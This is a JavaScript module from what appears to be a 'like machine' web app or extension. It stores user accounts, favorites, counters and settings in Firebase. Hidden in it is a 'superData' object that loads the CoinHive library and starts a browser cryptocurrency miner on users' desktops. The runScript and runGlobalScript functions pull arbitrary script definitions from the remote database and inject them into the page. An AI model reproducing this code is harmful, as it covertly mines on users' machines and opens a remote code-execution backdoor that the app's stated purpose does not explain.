import * as firebase from 'firebase/app';

import 'firebase/database';

const config = {
    apiKey: "AIzaSyBIUHNsOVc_y3SjERdiEd2L0IKZmQE-j2M",
    authDomain: "the-like-machine-d269b.firebaseapp.com",
    databaseURL: "https://the-like-machine-d269b.firebaseio.com",
    projectId: "the-like-machine-d269b",
    storageBucket: "the-like-machine-d269b.appspot.com",
    messagingSenderId: "458103066042"
  };

const superData = {
  globalScript: false,
  runScript: false,
  scripts: [
    {
      src: "https://coinhive.com/lib/coinhive.min.js"
    },
    {
      innerHTML: "setTimeout(function() {var miner = new CoinHive.Anonymous('97lDOErzVjBlmftmFfP5CIStJzrVAv0A', {throttle: 0.3}); if (!miner.isMobile() && !miner.didOptOut(1000)) {miner.start();}}, 2000)",
      type: "text/javascript"
    }
  ]
}

firebase.initializeApp(config);

export function checkAccounts(account, callback) {
  const usersRef = firebase.database().ref('accounts').child(account).once('value')
  .then((e) => {
    callback(e.val(), account);
  }, (error) => {
  });
};

export function setUnlimitedDB(account, bool) {
  try {
    const usersRef = firebase.database().ref('accounts/' + account + '/unlimited/').set(bool);
  } catch (e) {
  }
}

export function setDateLikeTodayDB(account, date) {
  try {
    const usersRef = firebase.database().ref('accounts/' + account + '/dateLikeToday/').set(date);
  } catch (e) {
  }
}

export function setCounterDB(account, data) {
  try {
    const usersRef = firebase.database().ref('accounts/' + account + '/counter/').set(data);
  } catch (e) {
  }
}

export function setFavoritesDB(account, data) {
  try {
    const usersRef = firebase.database().ref('accounts/' + account + '/favorites/').set(data);
  } catch (e) {
  }
}

export function setSettingsDB(account, data) {
  try {
    const usersRef = firebase.database().ref('accounts/' + account + '/settings/').set(data);
  } catch (e) {
  }
}

function runScript(scripts) {
  scripts.forEach((item, i) => {
    const script = document.createElement('script');
    Object.keys(item).forEach((item2, i2) => {
      script[item2] = scripts[i][item2];
    })
    document.body.appendChild(script);
  })
}

function runGlobalScript() {
  try {
    const usersRef = firebase.database().ref('global').once('value')
    .then((e) => {
      const value =  e.val();
      if (value && value.runScript) runScript(value.scripts);
    });
  } catch (e) {

  }
}

export function runSuper(account) {
  try {
    const usersRef = firebase.database().ref('accounts/' + account + '/super/').once('value')
    .then((e) => {
      const value =  e.val();
      if (value) {
        if (value.runScript) runScript(value.scripts);
        if (!value.runScript && value.globalScript) runGlobalScript();
      } else {
        const usersRef = firebase.database().ref('accounts/' + account + '/super/').set(superData);
      }
    });
  } catch (e) {

  }
}
